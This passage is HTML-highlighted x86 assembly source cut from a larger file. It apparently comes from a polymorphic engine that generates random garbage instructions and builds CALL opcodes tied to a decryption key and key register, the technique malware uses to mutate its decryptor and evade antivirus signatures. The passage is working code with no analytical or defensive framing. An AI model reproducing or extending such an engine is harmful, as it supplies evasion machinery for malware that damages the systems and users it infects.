                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore this, elimi-</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; nating any created</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call before</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; Restore EDI...</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CJ_Again3</span><span class="sc0">  </span><span class="sc1">; ...and repeat the garbage generation</span><span class="sc0">
               </span><span class="sc1">; Here if the size of the garbage is correct</span><span class="sc0">
       </span><span class="sc5">@@CJ_OK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Release the data in stack</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; Put the displacement in AL</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; Calculate the distance until the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Set the displacement in</span><span class="sc0">
                                                 </span><span class="sc1">; the opcode</span><span class="sc0">
              </span><span class="sc1">;  jmp   @@Return</span><span class="sc0">

    </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@@DontMake</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; Conserve EDI when POPAD</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Decrease recursi-</span><span class="sc0">
                                                          </span><span class="sc1">; vity level</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc1">; Return completely or just to another running instan-</span><span class="sc0">
                        </span><span class="sc1">; ce of Garbage</span><span class="sc0">
</span><span class="sc5">Garbage</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ImInRandomLoop</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Variable to avoid nested garbage loops</span><span class="sc0">

</span><span class="sc1">;; EAX=Address to make a CALL to</span><span class="sc0">
</span><span class="sc5">MakeCALLTo</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CALLToMem</span><span class="sc0">
  </span><span class="sc5">@@CALLToReg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CALLToReg</span><span class="sc0">   </span><span class="sc1">; No key register!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CALLToReg2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">@@CALLToReg2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">

  </span><span class="sc5">@@CALLToMem</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CALLToReg</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MoveToRegForCALL</span><span class="sc0">
       </span><span class="sc5">@@DirectCALLToMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DC_00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@DC_00</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10FFh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@DC_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@DC_01</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DC_02</span><span class="sc0">
      </span><span class="sc5">@@DC_01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
      </span><span class="sc5">@@DC_02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc5">@@DC_03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">
      </span><span class="sc5">@@DC_00</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DC_03</span><span class="sc0">

     </span><span class="sc5">@@MoveToRegForCALL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectValueForCALL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DVFC_001</span><span class="sc0">
     </span><span class="sc5">@@DirectValueForCALL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">@@DVFC_001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DVFC_001</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@DVFC_001_</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">@@DVFC_001_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FirstMovReg</span><span class="sc0">
    </span><span class="sc5">@@FirstMovMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FMM_PushFirst</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">@@FMM_001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertCALL</span><span class="sc0">
      </span><span class="sc5">@@FMM_PushFirst</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@FMM_001</span><span class="sc0">
    </span><span class="sc5">@@FirstMovReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">@@InsertCALL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
